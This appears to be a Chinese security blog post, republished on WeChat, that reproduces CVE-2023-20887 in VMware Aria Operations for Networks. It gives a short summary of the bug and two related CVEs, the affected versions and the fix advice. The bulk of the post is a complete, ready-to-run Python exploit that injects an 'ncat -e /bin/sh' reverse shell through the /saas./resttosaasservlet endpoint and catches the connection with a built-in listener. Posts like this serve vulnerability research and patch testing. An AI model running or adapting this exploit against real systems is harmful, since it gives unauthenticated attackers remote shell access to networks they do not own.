#  CVE-2023-20887漏洞复现

巢安实验室  [ 巢安实验室 ](javascript:void\(0\);)

**巢安实验室** ![]()

微信号 safe-labs

功能介绍 为荣誉而战，为的是那份自己不屈服于任何人，踢踏是脚下的尊严。

____

___发表于_

收录于合集 #漏洞复现 67个

![](https://gitee.com/fuli009/images/raw/master/public/20230617194503.png)  

**一. 漏洞介绍**

CVE-2023-20887 是 VMware Aria Operations for Networks 中的命令注入漏洞，可用于实现远程代码执行
(RCE)。正如 Summoning Team
的博客文章中所述，此漏洞的存在是由于两个问题的连锁反应。第一个问题是命令注入缺陷，但要到达易受攻击的代码，必须向由于 nginx
规则集而应被拒绝的端点发出请求。但是，该博客指出可以通过特制请求绕过该规则。通过在精心设计的请求中将这两个问题链接在一起，它将允许未经身份验证的攻击者实现
RCE。

CVE-2023-20888 是 VMware Aria Operations for Networks
中的一个反序列化漏洞。具有有效“成员”角色凭据的经过身份验证的攻击者可以使用精心设计的请求来执行反序列化攻击，从而导致 RCE。

CVE-2023-20889 是 VMware Aria Operations for Networks
中的一个信息泄露漏洞。具有网络访问权限的经过身份验证的攻击者可以执行命令注入攻击，这将导致数据泄露。

 **二. 影响范围**

 Aria Operations for Networks versions 6.2 / 6.3 / 6.4 / 6.5.1 / 6.6 / 6.7 /
6.8 / 6.9 / 6.10。

 **五. 漏洞修复**

            由于没有解决方法，VMware 建议更新到固定版本。

 **六. 漏洞检测POC**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     """VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCEVersion: 6.8.0.1666364233Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)A root cause analysis of the vulnerability can be found on my blog:https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/"""import warningswarnings.filterwarnings("ignore", category=DeprecationWarning)import requestsfrom threading import Threadimport argparsefrom telnetlib import Telnetimport socketrequests.packages.urllib3.disable_warnings()  
      
      
    argparser = argparse.ArgumentParser()argparser.add_argument("--url", help="VRNI URL", required=True)argparser.add_argument("--attacker", help="Attacker listening IP:PORT (example: 192.168.1.10:1337)", required=True)  
    args = argparser.parse_args()  
      
      
      
    def handler():    print("(*) Starting handler")    t = Telnet()    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind((args.attacker.split(":")[0],int(args.attacker.split(":")[1])))    s.listen(1)    conn, addr= s.accept()    print(f"(+) Received connection from {addr[0]}")    t.sock = conn    print("(+) pop thy shell! (it's ready)")    t.interact()  
    def start_handler():    t = Thread(target=handler)    t.daemon = True    t.start()  
      
    def exploit():    url = args.url + "/saas./resttosaasservlet"    revshell = f'ncat {args.attacker.split(":")[0]} {args.attacker.split(":")[1]} -e /bin/sh'    payload = """[1,"createSupportBundle",1,0,{"1":{"str":"1111"},"2":{"str":"`"""+revshell+"""`"},"3":{"str":"value3"},"4":{"lst":["str",2,"AAAA","BBBB"]}}]"""    result = requests.post(url, headers={"Content-Type":"application/x-thrift"}, verify=False, data=payload)  
    print("VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)")start_handler()exploit()  
    try:    while True:        passexcept KeyboardInterrupt:    print("(*) Exiting...")    exit(0)

![](https://gitee.com/fuli009/images/raw/master/public/20230617194505.png)

 **七.参考链接**  

  *   *   *   *   * 

    
    
     https://kb.vmware.com/s/article/92684https://nvd.nist.gov/vuln/detail/CVE-2023-20887https://securityonline.info/poc-released-for-vmware-aria-operations-for-networks-rce-cve-2023-20887-bug/https://www.helpnetsecurity.com/2023/06/15/cve-2023-20887-poc-exploit/https://github.com/sinsinology/CVE-2023-20887

 **本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

 **  
**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。文库内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

 **  
**

 **敲敲小黑板：《刑法》第二百八十五条
【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

